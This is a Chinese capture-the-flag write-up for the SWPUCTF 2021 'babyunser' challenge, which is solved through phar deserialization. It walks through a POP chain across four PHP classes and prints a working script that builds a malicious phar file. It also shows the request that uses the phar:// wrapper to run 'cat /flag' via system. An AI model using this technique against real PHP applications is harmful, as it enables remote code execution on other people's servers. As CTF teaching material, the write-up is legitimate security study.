## 基本信息

* 题目名称： [SWPUCTF 2021 新生赛]babyunser
* 题目链接： http://node5.anna.nssctf.cn:27981
* 考点清单： phar反序列化
* 工具清单： PHP环境，hackbar
* payloads： 无

## 一、看到什么

**题目关键信息列表**：

1. 题目给了两个接口，一个上传文件，一个下载文件。

2. 上传完成之后也会直接给出文件路径。

## 二、想到什么解题思路

1. 直接上传文件，发现上传图片，压缩包，`php`类型的文件都会被转化为`txt`文件进行存储。
2. 尝试着将`upload.php`和`read.php`文件的内容也通过`read.php`进行读取
3. 有多种类，但是没有`unserialize()`函数，考虑`phar`反序列化

## 三、尝试过程和结果记录

**尝试过程：**

1. 上传文本类型和图片类型，以及压缩包类型的文件都会以`txt`的形式进行存储。
2. 尝试使用【查看文件】的功能读取一下题目相关的文件，包括`index.php`，`upload.php`和`read.php`
    - `index.php`就是一个导航页面。
    - `upload.php`将我们上传的文件放在`upload`目录下，并用时间的`md5`值作为文件名，`txt`作为文件类型。
    - `read.php`中实例化对象相关的代码，并且引入了`class.php`。且题目的`php`代码中间还存在前端代码，容易导致`php`代码漏看。
    - `class.php`里面定义了很多很多的类，考察的是反序列化的内容。
    
3. `class.php`里的这些类看起来就非常复杂，我们构造反序列化链的时候，一定要从出口或者是入口找起，这样逻辑性更强。不难看出这里有一些危险函数，出口的位置也还需要确定。我们这里还需要回顾这些魔术方法的触发条件。
    - `__construct`创建类的新对象时,，会自动调用该方法。
    - `__toString()`将对象转换为字符串时自动触发
    - `__invoke()` 将对象作为函数调用时触发
    - `__get($key)` 访问对象中不存在的属性时触发，并将名字作为参数传入
    - `__destruct()` 对象销毁，或者脚本执行完时触发
    - `__call($name,$arg)` 调用一个不存在或不可访问的方法时被触发。

4. 先看一下每个类都有哪些方法和属性。

    - `aa`类，有一个属性`$name`，实例化这个类的时候，会将`$name`值初始化赋值为`aa`，当对象销毁时，会触发`strtolower()`函数，将`$name`当作字符串处理，小写化。注意，这个会触发`__toString()`方法要留个心眼。
    
    - `ff`类，有一个私有属性`$content`和公有属性`$func`，在实例化这个类的时候，会将`$content`初始化为一句话木马，如果这里是突破口，我们就要找到这个`$content`值所在的文件的位置。但是要注意它是私有属性，外面是访问不到的。所以没那么简单。`__get($key)`方法是在`$key`不存在时触发，并且`$key`的属性是`ff`类的`$func`，`$func`作为函数名，`cmd`作为函数的参数。

    - `zz`类，有`$filename`和`$content`两个公有属性，`__construct()`方法是将`$filename`进行赋值。`filter()`方法是对一些文件名关键词进行过滤，看的出来是一些伪协议。`write($var)`方法是将`$filename`属性下的`$var`属性赋值给`$lt`。
    玩`CTF`的最抽象了，它无缘无故这里说一个`//此功能废弃，不想写了`，大概率就是提示你这个要使用。`getFile()`方法是调用`filter()`方法，并读取`$contents`的内容进行返回，为空则提示404，最后还有一个`__toString()`方法，当`zz`这个对象被作为字符串使用时会触发该方法，接受传递的参数`method`和`var`，调用函数`method(var)`，并且将`content`返回。

    - `xx`类，有`$name`和`$arg`两个公有属性，类实例化时会将`$name`和`$arg`分别赋值为`eval`和`phpinfo();`,有查看`php`配置信息的意思了。它还有一个`__call()`函数，当`__call()`在调用一个不存在或不可访问的方法时被触发。就会执行`$name($arg[0]);`默认的是`eval(phpinfo()[0]);`，确实也可以执行。但是想想，题目给那么多参数，肯定没那么好心直接写好。

5. `read.php`里有如下的内容，所以我们可以尝试从这里分析。
    ```php
    $a=new aa();


    $file=new zz($filename);
    $contents=$file->getFile();
    ```
6.  `__toString()`方法使用了两个传入的参数，并且这里有函数执行，能够指向`write($var)`这个有提示的函数，所以这个方法大概率是被调用的。所以往前推一下，`strtolower`方法也要被调用。因此我们先尝试以`aa`这个类为链的头，记为第一步。
    ```
    $a = new aa();
    ```
7. 要使得第二步触发`tostring`方法，则`$a`的`$name`设置为`new zz()`;`__toString()`方法会执行`method(var)`函数，先将`method`设置为`write`，则当前实例化的`zz`类的`filename`属性下会有一个`var`属性，并且赋值给了`$lt`。`ff` 类中有个私有属性`$content`，并且有`__get($key)`，外部访问`$content`属性就会触发这个方法，并且这里也有外部`post`传递的参数，感觉就利用上了。于是这里就把`var`的值赋值为`content`。

    ```
    $a -> name = new zz();
    ```
8. 第三步：我们还要使得`$content`在`zz`这个类里作为属性被访问，所以`$this->filename`要赋值为
`new ff()`; 这样 `__get($key)`就被触发了，且`$key`是`$var`，`$var`的`$func`属性作为函数名称，`POST`传递的`cmd`参数作为函数参数。这个时候，就可以设置危险函数，比如`$func=system,cmd=cat /flag`。但是这个类里面并没有这个函数方法`system()`。

    ```
    $a -> name -> filename = new ff();
    ```

9.第四步：别忘记 `xx`类还有`__call()`方法，当这个类中函数方法不存在时就会触发。所以将`$this->$key`中的`$key`设置为`xx`类，也即`content`设置为`xx`类,`$name`和`$arg`会自动获取为`$func`的值`system`和`cmd`的值`cat /flag`。需要注意的是，`$content`为私有属性，需要类内赋值。

    ```
        public function __construct(){
        $this->content= new xx();
    }
    ```

10.构造`pop`链的时候，可以将类的一些无关方法删除，因为其中的一些量本地可能没有，删除不影响在云端运算的结果。下面的有关`phar`的则是标准操作，用来生成`phar`文件。需要在`php.ini`文件中修改`phar.readonly= Off`或者是终端临时设置`php -d phar.readonly=0 test.php`来允许生成`phar`文件。

    ```php
    <?php
        class aa{
            public $name;
        }

        class ff{
            private $content;
            public $func = 'system';

            public function __construct(){
                $this->content= new xx();
            }

        }

        class zz{
            public $filename;
            public $content;

        }

        class xx{
            public $name;
            public $arg;

        }
        $a = new aa();
        $a -> name = new zz();
        $a -> name -> filename = new ff();
        $phar = new phar('exp.phar');
        $phar -> startBuffering();
        $phar -> setStub("<?php __HALT_COMPILER();?>");
        $phar -> setMetadata($a); 
        $phar -> addFromString("test.txt","test");
        $phar -> stopBuffering();
        ?>
    ```
    ![](images/[SWPUCTF%202021%20新生赛]babyunser-php.png)

11. 上传`phar`文件。并获取文件路径`upload/6d2151e639ecf66fd66d1b8c51c78c12.txt`。
 
12. 在查看文件的接口打开`hackbar`，使用`phar`协议传输`file=phar://upload/6d2151e639ecf66fd66d1b8c51c78c12.txt&method=write&var=content&cmd=cat /flag`，即可得到`flag`。

    ![](images/[SWPUCTF%202021%20新生赛]babyunser-flag.png)


## 四、总结与反思

1. 善于观察，可以查看用户上传文件内容的接口是不是也能查看题目的文件。
2. 题目给出多个类，猜测是构造`pop`链，没有`unserialize()`函数，考虑`phar`反序列化

